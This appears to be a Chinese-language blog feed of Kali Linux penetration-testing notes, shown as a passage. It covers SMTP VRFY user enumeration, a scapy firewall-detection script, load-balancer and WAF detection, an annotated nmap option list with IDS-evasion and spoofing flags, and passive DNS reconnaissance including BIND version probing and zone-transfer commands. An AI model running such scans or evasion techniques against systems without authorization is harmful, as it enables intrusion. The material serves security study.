banner=s.recv(1024)
# 回收返回包进行打印
print banner + 'aaaaaaaaaaaa'
s.send('VRFY' + sys.argv[1] + '\r\n')


# 使用VRFY验证用户是否存在
result=s.recv(1024)
print result
s.close()
</code></pre>
<h3 id="防火墙识别">防火墙识别</h3>
<p>​	原理：向目标发送包，不引起防火墙的报警，通过回包判断防火墙的类型，过滤的端口(过滤的端口不是开放在防火墙上的端口，比如防火墙内部存在一台机器，他主动向外发送访问链接，这时，防火墙也会开放一个1024以上的一个高位端口与外面的服务器进行连接，向外发送请求，不是接受外部的请求。)比如这里需要进行百度的访问，那么会在这台主机的边界防火墙上面临时为这个访问请求开放一个临时的端口，这个端口只是用来向外发送请求，他不是接收外部人员向内部发送请求。另外还有一些防火墙可能会做一些源地址或是目标地址的过滤，只允许来自某个IP地址对他的端口的访问，否则其他的访问会默认地进行过滤掉，这些端口也可能开放在防火墙上，只是被防火墙进行了过滤，如果要扫描发现这些端口，通过这些端口来访问识别是什么类型的防火墙，以及端口过滤是如何做到的，大概有四种情况存在：</p>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210516171400.png" alt="" loading="lazy"></figure>
<h4 id="scapy-10">scapy</h4>
<pre><code class="language-python">./fw_detect.py 1.1.1.1 443

#!/usr/bin/python

import sys
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
fron scapy.all import*

if len(sys.argv)!=3:
 print &quot;Usage - ./FW_detect.py [Target-IP] [Target Port]&quot;
 print &quot;Example - ./FW_detect.py 10.0.0.5 443&quot;
 print &quot;Example will determine if filtering exists on port 443 of host 10.0.0.5&quot;
 sys.exit()
# 两个参数：防火墙IP地址与防火墙端口

# 参数赋值
ip = sys.argv[1]
port = int(sys.argv[2])

# 发送ACK包收到的响应
ACK_response = sr1(IP(dst=ip)/TCP(dport=port,flags='A'),timeout=1,verbose=0)
# 发送SYN包收到的响应
SYN_response = sr1(IP(dst=ip)/TCP(dport=port,flags='S'),timeout=1，verbose=0)
if (ACK_response == None) and (SYN_response == None):
 print &quot;Port is either unstatefully filtered or hostis down&quot;
elif ((ACK_response == None) or (SYN_response == None)) and not ((ACK_response == None) and (SYN_response == None)):
 print &quot;Stateful filtering in place&quot;
elif int (SYN_response[TCP].flags) == 18:
 print &quot;Port is unfiltered and open&quot;
elif int (SYN_response[TCP].flags) == 20:
 print &quot;Port is unfiltered and closed&quot;
else:
 print&quot;Unable to dotermine if the port is filtered&quot;
</code></pre>
<h4 id="nmap-11">nmap</h4>
<pre><code class="language-shell"> Nmap有系列防火墙锅炉检测功能
 
nmap 172.16.36.135 -p 22
nmap -sA 172.16.36.135 -p 22
# 结和syn以及ack进行判断防火墙类型
# nmap默认情况下会进行SYN包的发送，-sA参数可以进行ACK包的发送
</code></pre>
<h3 id="负载均衡识别">负载均衡识别</h3>
<p>​	除了防火墙识别有的时候在目标系统之上还会存在各种各样的负载均衡的技术，他简单的来说分为两大类，一类是广域网负载均衡，另外一类是服务器负载均衡。</p>
<p>​	广域网负载均衡的本质实际上可以说是DNS，简单的来说。有种方法就是通过DNS轮询进行负载均衡，当需要访问一个域名的时候，一个域名被解析为多个A记录，解析到多个IP地址上，实现一个域名对应多个IP（每次访问相同的域名但是对应的IP不同）；另一种是基于智能DNS，进行访问同一个域名，在不同的地方，解析到的IP不同；或者还有智能判断等等。</p>
<p>​	服务器负载均衡，基于web的服务经常使用Nginx，Apache这种应用层的负载均衡，还可以使用lvs或者f5这种网络层的负载均衡设备去实现服务器的负载均衡。</p>
<p>​	在扫描探测的阶段，有必要去发现一个目标域名下面有多少个服务器，这些服务器可能由于管理员的配置不善，不同的服务器之间的安全防护不同，配置不同，有的IP可以发现问题，有些服务器进不去，这时目标系统时用的是什么样的负载均衡，以及这个负载均衡它本身是否就存在漏洞，这也是扫描的一点，kali里面也有这样的工具。</p>
<p>​	负载均衡：</p>
<h4 id="lbd">lbd</h4>
<pre><code class="language-shell">lbd www.baidu.com 
lbd mail.163.com

# 扫描到同一个域名只解析到一个IP地址的话，那麽这个IP地址对应的应该是对应负载均衡的设备，而不是真实的服务器，这些真实的设备通过转发，在将用户的请求转发到真实的后端服务器上面，通过这种方式可以将后端的服务器保护起来，攻击者没有办法发现，同时在这些负载均衡上面可能存在一些过滤安全防护机制，会对信息先进行过滤。
</code></pre>
<h3 id="waf识别">WAF识别</h3>
<p>​	WAF——web应用防火墙，主要是用来防护web层的攻击。</p>
<h4 id="wafw00f">wafw00f</h4>
<p>​	能够进行常用的waf的检测</p>
<pre><code class="language-shell">wafw00f -l 
# 查看能够检测waf的列表

wafw00f http://www.microsoft.com
</code></pre>
<h4 id="nmap-12">nmap</h4>
<pre><code>nmap www.microsoft.com --script=http-waf-detect.nse
</code></pre>
<h2 id="nmap参数使用">NMAP参数使用</h2>
<pre><code class="language-shell">Nmap 7.91 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}

# 0. nmap 手册
man nmap 

# 1. 目标发现
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  可以跟参数主机名、IP地址、网络等。
  
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  域名，子网掩码，IP地址
  
  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
  把不连续的IP存成一个文件，做成一个列表文件，去扫列表文件里的IP
  
  -iR &lt;num hosts&gt;: Choose random targets
  eg:nmap -iR 100 -p22
  随机选择目标
  
  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
  eg:nmap 192.168.200.0/24 --exclude 192.168.200.1-100 
  假如要扫描的地址段中存在不想要扫描的目标，但是又不想要分次扫描
  
  --excludefile &lt;exclude_file&gt;: Exclude list from file
  要排除的地址放入一个文件中
  
# 2. 主机发现  
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  eg:nmap -sL 192.168.200.0/28
  不做扫描，只是将要进行扫描的地址段输出出来表示,子网掩码计算的功能
  
  -sn: Ping Scan - disable port scan
  不做端口扫描
  
  -Pn: Treat all hosts as online -- skip host discovery
  假如有些目标机器是防火墙，现在对他进行探测，他会进行拒绝发现，将包丢弃，或发送rst，这种情况如果不加-Pn，nmap会：它没有对我进行回报，所以我认为它不存在，不进行后续端口扫描，加上则会进行更加详细的扫描，判断IP是否存在
  
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  使用SYN/ACK/UDP/SCTP进行发现
  
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  ICMP echo/时间戳/查询子网掩码（一般查不到，需要结合脚本）
  
  -PO[protocol list]: IP Protocol Ping
  IP扫描
  
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  -n不做DNS地址解析，
  -R反向解析
  
  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
  nmap做DNS解析时调用的是指定的DNS服务器，而不用操作系统配置的DNS服务器，有时对国外的DNS做解析时会使用
  
  --system-dns: Use OS's DNS resolver
  操作系统默认的DNS
  
  --traceroute: Trace hop path to each host
  扫描时进行路由追踪
  
# 3. 端口发现
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  TCP扫描发SYN/完整TCP扫描/ACK/TCP窗口/Maimon(Ack+Fin)进行扫描，默认为-sS
  
  -sU: UDP Scan
  eg:nmap -sU -p53 192.168.200.134
  UDP扫描
  
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  TCP全空/FIN/(FIN+PSH+URG)
  
  --scanflags &lt;flags&gt;: Customize TCP scan flags
  自定义TCP的flags发包
  
  -sI &lt;zombie host[:probeport]&gt;: Idle scan
  僵尸扫描
  
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  为SCTP协议准备的参数，很少使用
  
  -sO: IP protocol scan
  IP扫描
  
  -b &lt;FTP relay host&gt;: FTP bounce scan
  专门针对FTP中继的场景使用

# 4. 如何指定扫描的端口
PORT SPECIFICATION AND SCAN ORDER:
  -p &lt;port ranges&gt;: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  直接指定端口，可以指定使用UDP或是TCP的端口，不指定则都会去扫
  
  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
  不扫描的端口
  
  -F: Fast mode - Scan fewer ports than the default scan
  不加端口参数会扫描1000个常用端口，加上-F则会扫描少一些端口
  
  -r: Scan ports consecutively - don't randomize
  扫描端口连续的扫描，顺序进行扫描，默认是无序的
  
  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
  只扫1000个端口排名靠前的
  
  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;
  扫描更常见端口

# 5. 探测端口上面跑的服务
SERVICE/VERSION DETECTION:  
  -sV: Probe open ports to determine service/version info
  默认情况下-sV会集成使用大量的特征库，进行探测
  
  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
  nmap -p21 192.168.200.134 -sV --version-intensity 9 
  扫描的深入程度从0-9，特征库，当扫描结果不是那麽准确时使用9
  
  --version-light: Limit to most likely probes (intensity 2)
  相当于：--version-intensity 2
  
  --version-all: Try every single probe (intensity 9)
  相当于：--version-intensity 9
  
  --version-trace: Show detailed version scan activity (for debugging)
  nmap -p21 192.168.200.134 -sV --version-intensity 9 --version-trace
  对扫描的过程进行一个追踪，能够更加清楚扫描的过程

# 6. 脚本扫描/usr/share/nmap/scripts/
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of
           directories, script-files or script-categories
  以上两个等价
  
  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  使用脚本时可以设置脚本参数
  
  --script-trace: Show all data sent and received
  对脚本扫描的过程进行一个追踪，能够更加清楚脚本扫描的过程
  
  --script-updatedb: Update the script database.
  eg：nmap --script-updatedb
  nmap升级脚本库，来源于官方
  
  --script-help=&lt;Lua scripts&gt;: Show help about scripts.
           &lt;Lua scripts&gt; is a comma-separated list of script-files or
           script-categories.
  eg：nmap --script-help=&lt;脚本名称&gt;
  使用脚本帮助。
  
# 7. 操作系统扫描
OS DETECTION:
  -O: Enable OS detection
  检测操作系统类型
  
  --osscan-limit: Limit OS detection to promising targets
  限制OS检测（只检测win或只检测Linux）
  
  --osscan-guess: Guess OS more aggressively

# 8. 时间与性能相关
TIMING AND PERFORMANCE:
  Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  默认扫描时，nmap扫描很快，容易引起操作系统的警觉，容易被发现，这时，可以通过设置时间参数，来进行时间间隔的设定（毫秒，秒，分，时）
  
  -T&lt;0-5&gt;: Set timing template (higher is faster)
  
  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes
  最少一次扫描多少个主机，或最大一次扫多少个主机
  
  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization
  指定并行扫描最小还是最大的扫描的数量
  
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies probe round trip time.
  指定最小/最大的rtt：来回访问时间
  
  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.
  最大retries探测次数
  
  --host-timeout &lt;time&gt;: Give up on target after this long
  目标主机超时时间
  
  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes
  eg：nmap 1.1.1.1 --scan-delay 10s
  扫描延迟多长时间，每发一次
  
  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second
  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second
  最小或最大速率，限制每秒发包的数量

# 9. 防火墙与IDS的躲避与欺骗
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)
  设置传输单元，最大传输单元默认由mtu最小值的设备决定
  
  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys
  eg：nmap -D 192.168.1.10,192.168.1.11,192.168.1.134 1.1.1.1
  伪造源地址，增加噪声IP，不是对本身地址进行隐藏
  
  -S &lt;IP_Address&gt;: Spoof source address
  eg：nmap -S 192.168.1.11 -e eth0 1.1.1.1
  欺骗源地址，有明显弊端，得不到回报
  
  -e &lt;iface&gt;: Use specified interface
  指定使用网卡接收信息，可以搭配wireshark
  
  -g/--source-port &lt;portnum&gt;: Use given port number
  使用指定的源端口，可以搭配wireshark使用
  
  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies
  扫描目标，使用代理，掩护真实扫描地址
  
  --data &lt;hex string&gt;: Append a custom payload to sent packets
  eg：nmap -p22 192.168.1.134 --data=FFFFFFFFFF
  扫描包里通常没有数据字段，加上，则除了发送平常的信息之外，还会加上所指定的一堆东西
  
  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets
  也可以加ASCII码，ABC，12345
  
  --data-length &lt;num&gt;: Append random data to sent packets
  限制数据长度
  
  --ip-options &lt;options&gt;: Send packets with specified ip options
  可以有源路由等的信息
  
  --ttl &lt;val&gt;: Set IP time-to-live field
  设定ttl值，为固定的
  
  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
  nmap -p22 192.168.1.134 --spoof-mac 00:11:11:11:11:11
  欺骗mac地址
  
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
  每个数据包的包头里面都有一个差错校验值(checksum)，是根据TCP的包头字段,进行二进制运算，通过这个值对数据包进行检验完整性
  这里是nmap可以故意发送一些bad错误的包，因为某些东西对包的处理机制不一样，可以由此来欺骗防火墙，使包能够正常发送

# 10. 输出格式
OUTPUT:
  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA &lt;basename&gt;: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume &lt;filename&gt;: Resume an aborted scan
  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to 
HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
# 11. 杂项
MISC:
  -6: Enable IPv6 scanning
  可以扫IPv6的地址
  
  -A: Enable OS detection, version detection, script scanning, and traceroute
  许多参数扫描的组合 -O -VS --script -traceroute
  
  --datadir &lt;dirname&gt;: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.

EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI 被动信息收集]]></title>
        <id>https://kite-007.github.io/kali-xin-xi-shou-ji/</id>
        <link href="https://kite-007.github.io/kali-xin-xi-shou-ji/">
        </link>
        <updated>2021-04-09T13:23:28.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
<li><a href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86dns">1. 信息收集——DNS</a><br>
*
<ul>
<li><a href="#nslookup">NSLOOKUP</a></li>
<li><a href="#dig">DIG</a></li>
<li><a href="#dns-%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93">DNS 区域传输</a></li>
<li><a href="#dns-%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4">DNS 字典爆破</a></li>
<li><a href="#dns-%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF">DNS 注册信息</a></li>
<li><a href="#3-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">3. 搜索引擎</a>
<ul>
<li><a href="#shodan">shodan</a></li>
<li><a href="#google">google</a>
<ul>
<li><a href="#1-google%E6%90%9C%E7%B4%A2%E5%9F%BA%E6%9C%AC%E7%AC%A6%E5%8F%B7%E7%9A%84%E6%84%8F%E4%B9%89">1. google搜索基本符号的意义</a></li>
<li><a href="#2-site%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95">2. site搜索语法</a></li>
<li><a href="#3-inurl%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95">3. inurl搜索语法</a></li>
<li><a href="#4-intitleintext%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95">4. intitle，intext搜索语法</a></li>
<li><a href="#5-cache%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95">5. cache:搜索语法</a></li>
<li><a href="#6-filetype%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95">6. filetype搜索语法</a></li>
<li><a href="#7-google-hack%E6%8B%93%E5%B1%95">7. Google Hack拓展</a></li>
</ul>
</li>
<li><a href="#%E5%85%B6%E4%BB%96%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7">其他搜索工具</a>
<ul>
<li><a href="#yandex">YANDEX</a></li>
<li><a href="#kali-theharvester">KALI-theHarvester</a></li>
<li><a href="#kali-metagoofil">KALI-metagoofil</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#4-maltego">4. maltego</a></li>
</ul>
</li>
</ul>
(渗透测试信息收集)</p>
<h1 id="介绍">介绍</h1>
<ul>
<li>公开渠道可获得的信息</li>
<li>与标系统不产⽣直接交互</li>
<li>尽量避免留下⼀切痕迹</li>
<li>被动信息收集主要的方式是通过互联网的搜集，目标的信息(ip ，域名等等)</li>
<li>关于信息收集的两个文档：
<ul>
<li>美国军⽅：<a href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf">http://www.fas.org/irp/doddir/army/atp2-22-9.pdf</a></li>
<li>北⼤⻄洋公约组织：<a href="http://information-retrieval.info/docs/NATO-OSINT.html">http://information-retrieval.info/docs/NATO-OSINT.html</a></li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>信息收集三个步骤：
<ol>
<li>被动信息收集，不与目标直接发生交互。</li>
<li>正常交互。</li>
<li>主动信息收集，扫描，探测等等。</li>
</ol>
</li>
</ul>
<hr>
<ul>
<li>
<p>信息收集内容</p>
<ul>
<li>IP地址段</li>
<li>域名信息</li>
<li>邮件地址</li>
<li>⽂档图⽚数据</li>
<li>公司地址</li>
<li><strong>公司组织架构</strong></li>
<li>联系电话 / 传真号码</li>
<li>⼈员姓名 / 职务</li>
<li><strong>目标系统使⽤的技术架构</strong></li>
<li>公开的商业信息
<ul>
<li>主要用于后期，通过邮件地址后续可以进行社会工程学的攻击和探测。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>信息收集用途</p>
<ul>
<li>用信息描述目标</li>
<li>发现
<ul>
<li>发现目标所使用的系统，发现具体的服务，后续社工</li>
</ul>
</li>
<li>社会工程学攻击</li>
<li>物理缺口</li>
</ul>
</li>
</ul>
<hr>
<h1 id="1-信息收集dns">1. 信息收集——DNS</h1>
<ul>
<li>域名解析成IP地址
<ul>
<li>域名与完全限定域名(FQDN)的区别；
<ul>
<li>eg：baidu.com就是一个域名，而www.baidu.com是一个FQDN。</li>
<li>FQDN可以说是域名的一个记录，一个域可以有很多种类型的域名记录。</li>
<li>域名记录：
<ul>
<li>A：主机记录，会把域名解析到一个IP地址上。</li>
<li>C name：别名记录，会把域名解析到另外一个域名上。</li>
<li>NS：这个域的域名服务器的地址记录。每一个域名都有一个域名服务器，一个或几个域名服务器对这个域进行域名的解析，域名服务器地址是通过DNS中的NS记录进行定义和注册的。</li>
<li>MX：邮件交换记录，会指向这个域的SMTP交换地址，每一个域名可能有邮件服务器，邮件服务器专门有针对邮件服务器地址的MX记录，也就是邮件交换记录。</li>
<li>ptr：反向解析，将IP解析为域名。前面的都是讲主机名解析为另外一个主机名，或者将主机名解析成一个IP地址这样的一个记录。ptr与他们相反，作用是是通过IP地址反向分析域名，这也需要有一个记录来进行解析，就是ptr记录。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>
<p>DNS解析过程：</p>
<ol>
<li>客户端会指定一个DNS服务器地址，这个DNS服务器地址通常会指向本地的运营商的一个域名服务器的地址，如果客户端有要访问百度的请求，那么就会先把域名发向本地服务器，由本地服务器来做域名解析，之后将目标服务器的域名解析成对应的IP地址，然后把结果返回给客户端。</li>
<li>客户端拿到真正的IP地址之后，就会访问真正应该访问的请求。</li>
<li>但是，本地运营商服务器通常情况下它本身并没有存储任何DNS记录，这种DNS服务器我们称之为缓存服务器，这种缓存DNS服务器它里面不包含任何的DNS缓存记录，它本身并不知道任何一个域名对应的IP地址是什么，当他接收到请求之后，会做进进一步的域名查询。他会首先将请求发送给根域服务器，根域也就是点域，像www.xinlang.com这个并不是一个完整意义上的域名，完整意义上称之为www.xinlang.com.最后的那个点我们通常会省略，实际上是真实存在的，那个点域就是DNS的根域，所有的DNS查询都可以从点域发起，来进行从头溯源的一个查询过程。</li>
<li>如果现在要解析www.xinlang.com会先将域名发送给本地的DNS缓存服务器，本地的DNS缓存服务器如果记录里面有这条记录，他就会直接把结果返回给客户端；如果没有就会把请求首先发给点域的域名服务器，点域的域名服务器查看该地址解析记录是否存在点域，点域服务器会回复不存在。</li>
<li>因为www.xinlang.com是不存在于根域里面的，DNS是一个分布式数据库，所以没有任何一台DNS服务器有全球上完整的DNS记录，他是分层级的，根域只保存根域里面的缓存记录，com域只保存com域的域名记录等等。</li>
<li>点域服务器中不存在之后，会返回一个结果给本地的DNS服务器，返回的结果是.com域的域名服务器的地址（NS记录），本地服务器缓存拿到之后就会象点域服务器的下一级.com域询问，.com域的服务器中也不存在这条记录，它里面存在类似XX.com这些.com的各种记录，之后他会像本地DNS服务器返回一个信息，xinlang.com（NS记录）的地址。本地服务器拿到返回之后就又会向xinlang.com这个域的域名服务器的地址，找到记录，返回正确的结果给本地缓存服务器，本地缓存服务器会先进行缓存一份，保存一个ttl的生成时间，当这个生成时间过去之后，它会将该记录删除掉，在这之前他会在一直保存这条记录，如果有其他的电脑来访问它，他就会在缓存记录中找到这条记录，就不会有后续的过程了。</li>
<li>客户端拿到真实IP之后会向外部通过路由访问向www.xinlang.com的web服务器，发出请求。</li>
<li>从客户端到DNS服务器为递归查询，从DNS服务器到各域服务器为迭代查询。</li>
<li><img src="https://kite-007.github.io/post-images/1618025139997.png" alt="" loading="lazy"></li>
</ol>
</li>
<li>
<p>运营商DNS 解释</p>
</li>
</ul>
<ol>
<li>
<p>本地dns到底是什么？为什么有时候看到的本地dns的ip是局域网类型的ip?</p>
</li>
<li>
<p>权威dns服务器是什么？ 是域名商在管理他吗？<br>
答：</p>
</li>
</ol>
<p>第一个问题：本地DNS一般是指你电脑上网时IPv4或者IPv6设置中填写的那个DNS。这个有可能是手工指定的或者是DHCP自动分配的。</p>
<p>如果你的电脑是直连运营商网络，一般默认设置情况下DNS为DHCP分配到的运营商的服务器地址。如果你的电脑和运营商之间还加了无线或者有线路由，那极有可能路由器本身还内置了一个DNS转发器，这玩意的作用是将发往他所有的DNS请求转发到上层DNS。此时由于路由器本身也接管了下挂电脑的DHCP服务，所以它分配给下面电脑的DNS地址就是它自身，所以你能看到电脑的DNS分配到的可能是192.168.1.1。实际上就是路由器自身，而路由器的DNS转发器将请求转发到上层ISP的DNS。所以这里说DNS是局域网或者是运营商的都可以（因为最终都是转发到运营商，小细节不用纠结）。</p>
<p>第二个问题：权威服务器是特殊的DNS服务器，所谓的权威是针对特定域名来说的。所以一般会说某某域名的权威DNS是谁，不能单纯的抛离域名问权威DNS是谁。是域名商在管理，负责解析在他这里购买的域名的权威解析（当然也存在此处购买域名挂靠别处权威的情况。同样，不要纠结于小细节，意思懂了就行。如果要了解原理请查找一下NS记录这个名词）。</p>
<h3 id="nslookup">NSLOOKUP</h3>
<p>windows和linux上面都存在。</p>
<pre><code># 输入nslookup进入工具
nslookup

# 输入域名,进行解析
www.sina.com

# 过滤查找记录为A记录，指定查找记录类型
set type=a（mx，记录优先级的数字，越小优先级越高）
或
set q=ptr（反向解析ip）
set q=any（任何类型的记录）
（text-spf记录：反垃圾邮件，反向域名解析，查询域名，如果和发送的域名相匹配，则不会被人认定为垃圾邮件。）

# 设置使用其他的域名服务器来查询
server 8.8.8.8

# 也可以用一条命令查询
nslookup -q=any www.baidu.com 8.8.8.8
</code></pre>
<ul>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412192336.png" alt="" loading="lazy"></li>
<li>server：本地主机使用的域名服务器地址，本地的DNS缓存服务器</li>
<li>后面是解析结果</li>
<li>解析并没有把这个域名的IP解析出来，说明这个域名不是一个A记录，返回了C Name记录，再对C Name进行解析，反复，可能到了最后就会得到A记录从而得到ip地址，逐级解析。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412194225.png" alt="" loading="lazy"></li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412194954.png" alt="" loading="lazy"></li>
<li>有时查出来的结果不一致是由于一个域名可以对应多个IP</li>
<li>server之后解析相同域名出来不一样的IP：现在大多数网站会使用智能DNS，意思是所处的网络终端用户所处的网络环境不同，那么他会根据终端用户所处的网络环境会返回的查询结果可能不同。为了优化互联网流量。</li>
</ul>
<h3 id="dig">DIG</h3>
<p>kali自带与nslookup类似但有更多的功能</p>
<pre><code>dig sina.com any 8.8.8.8

+noall #什么结果都不输出
+answer #输出的结果只看answer，
awk '{print $5}'#输出第五列

dig +noall +answer mail.163.com any | awk '{print $5}'
</code></pre>
<ul>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412202130.png" alt="" loading="lazy"></li>
</ul>
<ol start="0">
<li>反向解析域名：</li>
</ol>
<pre><code># -x为反向解析域名所增加的参数，所查的为PTR记录
dig -x 123.126.97.202 
</code></pre>
<ul>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412202734.png" alt="" loading="lazy"></li>
</ul>
<ol>
<li>查询bind版本信息</li>
</ol>
<ul>
<li>Linux或Uinux下如果要作为DNS服务器，在他们之中提供DNS服务的软件包通常情况下为bind。</li>
<li>在前面使用nslookup或是dig查询，不管是域名或是IP都出现了1对多的情况，而且dig即使其中加入了any参数，所查出来的结果中也只是sina.com的记录，不包含www.sina.com，这些FQDN记录。</li>
<li>最好是查到所有的DNS注册记录</li>
</ul>
<hr>
<pre><code>dig +noall +answer txt chaos VERSION.BIND ns3.dnsv4.com

查ns3.dnsv4.com所对应的版本信息。
txt： bind所对应的版本信息的记录
VERSION.BIND： bind版本
chaos： bind版本所对应的class类，前面的都是internet类
</code></pre>
<p>目的：寻查漏洞，能通过查到bind信息，如果bind的版本比较老的话，或者是存在漏洞的版本，那麽就可以利用这个漏洞，下载目标上所有的DNS记录并加以破解。</p>
<ol start="2">
<li>DNS追踪</li>
</ol>
<ul>
<li>发现DNS劫持</li>
</ul>
<pre><code>dig +trace www.baidu.com 
</code></pre>
<ul>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412212041.png" alt="" loading="lazy"></li>
<li>启用wireshark抓包：
<ul>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412213507.png" alt="" loading="lazy"></li>
<li>第一条表示的是本机向本地域名服务器发送请求，请求根域服务器，目前根域服务器全球一共有13个，所以每台DNS缓存上面都存在他们的域名及IP。</li>
<li>第二条会返回13个根域域名服务器的名称。</li>
<li>第三第四本地回向本地域名服务器查询IP地址，A表示IPv4下的g记录，AAAA表示IPv6下的g记录。</li>
<li>第五第六向本地返回了IP地址的结果IPv4的以及IPv6的。</li>
<li>一直持续到13条全部返回完毕之后</li>
<li>2</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412215035.png" alt="" loading="lazy"></li>
<li>到了第55条，从13个根域服务器里面任意挑选了一个进行查询。</li>
<li>56条，根域服务器返回结果，查询到一些C域，及最后的A域，如果没有查询到，则会继续向com域查询。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412215414.png" alt="" loading="lazy"></li>
<li>能够抓包查看对应解析的服务器名称，如果名称不正确，则发生DNS欺骗。</li>
<li>以上为迭代查询。</li>
<li>递归查询只查询了一次，并且返回了一条结果，dig www.baidu.com</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210412215807.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
<h3 id="dns-区域传输">DNS 区域传输</h3>
<ul>
<li>可以知道一个域里面的主机名称。</li>
<li>DNS 区域传输原本是发生在DNS之间信息同步的过程。像一个点域做出了改变，那麽在这个域名的数据库中的信息就发生了改变，所同步到的其他的点域也发生了改变。</li>
<li>正常情况下DNS区域传输只发生在本域的传输之间。如果DNS配置出现错误的话，可能会造成任何人都可以对此域名服务器进行区域传输，那麽就可以拿到此域下所有的主机记录以及IP地址。</li>
<li>常见命令：</li>
</ul>
<pre><code class="language-shell">dig @ns1.example.com example.com axfr
# 对example.com进行区域传输，先要知道此域的一个域名服务器ns1.example.com
# axfr 区域传输所使用的方法

host -T -l example.com ns1.example.com 8.8.8.8
# -l 进行axfr全区域传输
# -T 显示时间

host info
host --help
host -h
